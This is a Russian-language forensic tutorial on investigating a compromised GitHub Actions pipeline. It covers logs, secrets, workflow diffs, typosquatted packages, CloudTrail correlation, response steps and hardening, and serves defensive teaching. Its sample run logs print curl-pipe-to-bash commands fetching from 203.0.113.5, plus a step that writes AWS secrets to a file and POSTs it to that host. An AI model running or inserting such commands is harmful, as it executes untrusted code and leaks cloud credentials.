## Вопрос, с которого всё начинается

Подозрение: атакующий внедрился в **CI/CD** и меняет сборки. Пайплайн — идеальное место
для persistence: код собирается с правами деплоя. Разберём.

## Наш пример: облачный пайплайн

## Шаг 1: что такое CI/CD

Пайплайн (GitHub Actions/GitLab CI/Jenkins) выполняет шаги сборки/деплоя. У него есть:

- **секреты** (токены, ключи);
- **права** (деплой, доступ к облаку);
- **триггеры** (push, PR, расписание).

## Шаг 2: логи пайплайна

```
$ gh run view 12345 --log | head
Run build
  step: checkout
  step: install deps
  step: curl http://203.0.113.5/x | bash
```

Незнакомый шаг — прямой признак компромисса.

## Шаг 3: секреты

Секреты хранятся в пайплайне и подставляются в окружение:

```
env:
  AWS_SECRET_ACCESS_KEY: ***
```

Атакующий может:

- вывести секрет в лог (`echo $SECRET`);
- отправить его на свой сервер;
- использовать для доступа к облаку.

Ищи в логах утечки (маскируются, но не всегда).

## Шаг 4: следы в коде

- изменения в `.github/workflows/` или `.gitlab-ci.yml`;
- новые шаги, ссылающиеся на внешние скрипты;
- подменённые зависимости (supply chain);
- коммиты от необычных авторов.

```
$ git log --oneline -- .github/workflows/
```

## Шаг 5: что искать

- изменение конфигурации пайплайна;
- незнакомые шаги/скрипты;
- утечки секретов;
- использование прав пайплайна (создание ресурсов в облаке);
- коммиты в нерабочее время.

## Что мы теперь знаем

- CI/CD имеет секреты и широкие права.
- Логи пайплайна фиксируют шаги.
- Секреты могут утечь в логи.
- Изменения workflow — ключевой признак.
- Сопоставляй коммиты и API-логи облака.

## Если не сработало

- Логи короткие? Смотри историю запусков.
- Секреты маскированы? Проверь поведение (доступ к облаку).
- Нужен коммит? Читай git-историю.

## Разбор реального лога пайплайна

Возьмём выгрузку GitHub Actions и проследим аномалию по времени запуска.
Команда `gh run list` показывает все запуски, включая ручные (`workflow_dispatch`):

```
$ gh run list --limit 8
STATUS  TITLE                     WORKFLOW  BRANCH  EVENT              ID
OK      deploy prod               deploy    main    push               8891
OK      nightly                   ci        main    schedule           8884
OK      chore: bump deps          ci        main    push               8870
FAIL    hotfix                    ci        main    workflow_dispatch  8862   <- ручной
OK      deploy prod               deploy    main    push               8855
```

Ручной запуск в 03:41 сам по себе не приговор, но он аномален: деплой обычно
триггерится push. Открываем лог именно этого запуска и ищем шаги, которых нет
в штатном workflow:

```
$ gh run view 8862 --log | grep -nE 'step:|curl|wget|base64|export '
12  step: checkout
18  step: setup node
27  step: npm ci
44  step: curl -fsSL http://203.0.113.5/install.sh | bash   <- нет в YAML
51  step: export AWS_SECRET_ACCESS_KEY ... >> /tmp/env
52  step: curl -X POST --data-binary @/tmp/env http://203.0.113.5/collect
```

Шаг 44 тянет скрипт с внешнего IP, шаги 51-52 выгружают секрет окружения.
Это классическая **exfiltration секретов через пайплайн**: сначала получить
выполнение, затем собрать переменные окружения и отправить наружу.

## Таблица: артефакты CI/CD и что они доказывают

| Артефакт | Где лежит | Что доказывает |
|---|---|---|
| Лог запуска | Actions/GitLab UI, API | какие шаги и команды выполнялись |
| Определение workflow | `.github/workflows/*.yml` | что должно было выполняться |
| История коммитов | git log | кто и когда менял workflow |
| Артефакты сборки | storage (S3/GCS) | что именно было собрано/выгружено |
| Секреты | secret store | какие секреты были доступны шагу |
| API-логи облака | CloudTrail/Audit Log | что сделали правами пайплайна |

Ключевой приём: **сравнить определение workflow с фактическим логом**. Если
в логе есть шаг, которого нет в YAML, — определение подменили (или шаг
добавили в рантайме через `GITHUB_ENV`/`include`).

## Атака на цепочку поставки (supply chain)

Частый вектор — не правка своего workflow, а компрометация зависимости.
Разбираем по шагам:

1. Атакующий публикует пакет с именем, близким к популярному (typosquatting).
2. Пакет исполняет postinstall-скрипт при `npm ci`.
3. Скрипт читает окружение раннера и отправляет его на C2.

Признаки в логе и репозитории:

```
$ git diff HEAD~1 -- package-lock.json | head
-"lodahs": "4.17.21"
+"lodahs": "4.17.22"
```

Опечатка `lodahs` вместо `lodash` — явный тайпсквот. Проверяй не только
свой код, но и `package-lock.json`, `requirements.txt`, `go.sum`: любые
изменения версий/имён без внятного коммит-сообщения подозрительны.

## Тайминги и корреляция

Время — сильнейший коррелятор. Собери три шкалы времени и наложи их:

- время коммита в workflow (`git log --format='%ai %an %s'`);
- время запуска пайплайна (API/UI);
- время облачных вызовов (CloudTrail `eventTime`).

```
$ git log --format='%ai %h %an %s' -- .github/workflows/ | head -3
2026-03-11 03:39:52 +0000 9f2c1ab ci-bot  chore: bump deps
```

Если коммит в 03:39, запуск в 03:41, а создание IAM-пользователя в 03:42 —
это одна цепочка, и все три события доказывают компромисс.

## Границы метода и типичные ошибки

- **Маскирование секретов.** GitHub маскирует значения секретов в логах как
  `***`, но не маскирует производные (base64, hex, часть строки) — ищи
  кодированные выгрузки, а не только открытые токены.
- **Эфемерные раннеры.** После завершения раннер уничтожается, файловая
  система недоступна — единственный след остаётся в логах и API-аудитах.
- **Самозванный `ci-bot`.** Имя автора коммита легко подделать
  (`git -c user.name=...`), поэтому подпись коммита важнее имени.
- **Логи ротируются.** У GitHub Actions логи запусков старше 90 дней
  удаляются; для долгих расследований выгружай логи в SIEM заранее.

## Если сработало

Если в логе найден внешний `curl|bash` и выгрузка окружения — считай
компромисс подтверждённым и переходи к радиусу поражения:

```
$ aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=Username,AttributeValue=ci-deploy-role \
    --start-time 2026-03-11T03:00:00Z --max-results 20
```

Ищи созданные ресурсы: новые IAM-пользователи/ключи, изменённые роли,
открытые бакеты, снимки секретов. Каждый такой вызов — след на карте.

## Ручной запуск: легитимный против поддельного

Не каждый `workflow_dispatch` — атака. Отличия видны в деталях:

| Признак | Легитимный ручной запуск | Поддельный |
|---|---|---|
| Автор | дежурный инженер | неизвестный/новый аккаунт |
| Время | рабочие часы | 02:00–05:00 |
| Изменения в workflow | нет | есть (в том же окне) |
| Команды | штатные шаги | curl/wget/base64 наружу |
| После запуска | обычный деплой | создание ресурсов в облаке |

Проверяй автора через API: `gh run view 8862 --json actor` вернёт логин
инициатора. Если это бот-аккаунт CI — ручной запуск от него невозможен, значит
сессию угнали.

## Матрица прав токена

`GITHUB_TOKEN` в каждом запуске имеет права, задаваемые `permissions:`.
Дефолт может быть широким. Читай определение:

```
$ grep -A6 '^permissions:' .github/workflows/deploy.yml
permissions:
  contents: read
  id-token: write
  packages: write
```

`id-token: write` означает возможность получить OIDC-токен облака — именно
этим пользуются для входа в AWS/GCP без статических ключей. Если такой токен
выкраден, атакующий входит в облако **от имени пайплайна**, и в CloudTrail
это будет выглядеть как легитимный деплой.

## Чек-лист реагирования на компромисс CI/CD

1. Останови подозрительные workflow и отзови токены (`gh secret delete`,
   ротация OIDC trust policy).
2. Выгрузи логи всех запусков за окно атаки в SIEM.
3. Сравни определения workflow с последним «чистым» коммитом.
4. Проверь облачные логи по ролям, доступным пайплайну.
5. Ротируй все секреты, которые были в окружении скомпрометированного шага.
6. Проверь артефакты сборки на внедрённый код (собранный образ мог быть
   подменён ещё до деплоя).

Пункт 6 часто забывают: даже после отзыва токенов подменённый артефакт уже
развёрнут в проде и продолжает работать.

## Инструменты расследования CI/CD

| Задача | Инструмент |
|---|---|
| Список запусков | `gh run list`, GitLab API `/pipelines` |
| Полный лог | `gh run view --log`, `curl .../trace` |
| Diff workflow | `git log -p -- .github/workflows/` |
| Аудит облака | `aws cloudtrail lookup-events`, GCP `logging read` |
| Секреты в истории | `gitleaks detect`, `trufflehog git` |
| Проверка артефакта | `cosign verify`, `docker scan` |

`gitleaks detect --source . --log-opts="--all"` ищет секреты во **всей**
истории git, включая удалённые коммиты. Секрет, закоммиченный и затем
удалённый, остаётся в истории и остаётся валидным, пока его не отозвали.

## Долгосрочные меры

После инцидента закрывают корневую причину:

- OIDC вместо статических ключей — нет долгоживущих секретов;
- минимальные `permissions:` в каждом workflow;
- пиннинг экшенов по хешу (`uses: owner/act@<sha>`), а не по тегу;
- обязательный review для изменений `.github/workflows/`;
- подписывание артефактов и проверка подписи перед деплоем.

Пиннинг по тегу (`@v1`) небезопасен: тег можно передвинуть на вредоносный
коммит. Только полный SHA фиксирует конкретную ревизию.
